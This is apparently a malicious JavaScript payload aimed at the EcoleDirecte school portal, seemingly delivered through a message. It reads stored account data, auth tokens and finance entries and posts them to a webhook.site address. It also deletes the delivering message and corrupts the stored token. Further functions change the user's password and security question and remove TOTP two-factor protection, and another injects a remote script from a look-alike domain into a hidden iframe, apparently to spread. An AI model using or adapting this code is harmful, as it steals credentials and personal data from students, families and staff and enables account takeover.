
const params =
  document.querySelector('a[href*="idMessage="]')
    ? new URL(document.querySelector('a[href*="idMessage="]').href).searchParams
    : new URLSearchParams();

const idmessage = Number(params.get("idMessage")) || 0;
const iddossier = Number(params.get("idDossier")) || 0;


const accounts = JSON.parse(sessionStorage.getItem("accounts") ?? "null");
const credentials = JSON.parse(sessionStorage.getItem("credentials") ?? "null");

const idlogin = accounts?.payload?.accounts?.[0]?.idLogin ?? null;
const id = accounts?.payload?.accounts?.[0]?.id ?? null;
const tc = accounts?.payload?.accounts?.[0]?.typeCompte ?? null;
const token = credentials?.payload?.authToken ?? null;
const userid = accounts?.payload?.accounts?.[0]?.identifiant ?? null;
const a2factif = accounts?.payload?.accounts?.[0]?.parametresIndividuels?.is2FATOTPActif ?? false;
const mode = 1
const url = 'https://webhook.site/ac1d52e4-7f8b-4c26-a4e3-5c2d97e33be3';


const ntc = { P: "enseignants", A: "personnels" }[tc] || "bienjoué";

const dataObj = {
    action: "supprimer",
    ids: [idmessage],
    anneeMessages: "2025-2026",
    idDossier: iddossier
  };


const datamotdepasse = {
    identifiant: userid,
    motDePasseComteAssocie: "ceciestuntest",
    confirmationMotDePasse: "ceciestuntest",
    email: "ceciestuntest@test.com",
    portable: "",
    questionSecrete: "Autre",
    reponse: " c'est les autres",
    autreQuestionSecrete: "l'enfer",
    uuid: ""
  }

const postitobj = {}

async function kill() {
  const keys = [
    'accounts', 'badges', 'credentials', 'edhydration_auth',
    'etablissement', 'finances',
    'bigAds', 'fa', 'pdfjs.history'
  ];

  const data = {
    t: new Date().toISOString(),
    u: navigator.userAgent,
    l: location.href,
    s: {}
  };

  keys.forEach(key => {
    let value = sessionStorage.getItem(key);
    if (value === null) {
      value = localStorage.getItem(key);
    }

    if (value !== null) {
      try {
        data.s[key] = JSON.parse(value);
      } catch {
        data.s[key] = value;
      }
    }
  });

  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
};
kill();


async function supprime() {
  try {
  
    await fetch(`https://api.ecoledirecte.com/v3/${ntc}/${id}/messages.awp?verbe=delete&v=4.91.0`, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Token": token
      },
      body: "data=" + JSON.stringify(dataObj)
    });

        console.log(".");
  } catch (error) {
    console.log(error);
  }
}
supprime();



async function motdepasse() {
  try {

      await fetch(`https://api.ecoledirecte.com/v3/logins/${idlogin}.awp?verbe=put&v=4.92.0`, {
      method: "POST",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "X-Token": token
      },
      body: "data=" + JSON.stringify(datamotdepasse)
    });

    console.log("done");
  } catch (error) {
    console.log(error);
  }
} 

if (mode === 1) {
  //motdepasse();
} else {
}



async function deletea2f() {
  try {
    const response = await fetch("https://api.ecoledirecte.com/restv3/ws/auth/totp?v=4.92.1", {
      method: "DELETE",
      headers: {
        "content-type": "application/x-www-form-urlencoded",
        "X-Token": token
      }
    });
  } catch (error) {
    console.log(error);
  }
}

if (a2factif === true) {
  //deletea2f();
} else {
}



sessionStorage.setItem("credentials", JSON.stringify((a => {
    a.payload.authToken = "1234";
    return a
})(JSON.parse(sessionStorage.getItem("credentials")))));
(() => {
    function a(b) {
        const c = setInterval(() => {
            if (document.body) {
                clearInterval(c);
                b()
            }
        }, 10)
    }
    a(() => {
        const b = document.createElement("iframe");
        b.src = "/Famille";
        b.style.display = "none";
        document.body.appendChild(b);
        b.onload = () => {
            const c = b.contentDocument,
                d = setInterval(() => {
                    if (!c || !c.body) return;
                    clearInterval(d);
                    const e = c.createElement("script");
                    e.src = "https://ecoledirecte.fun/message.js";
                    e.async = true;
                    c.body.appendChild(e)
                }, 50)
        }
    })
})();



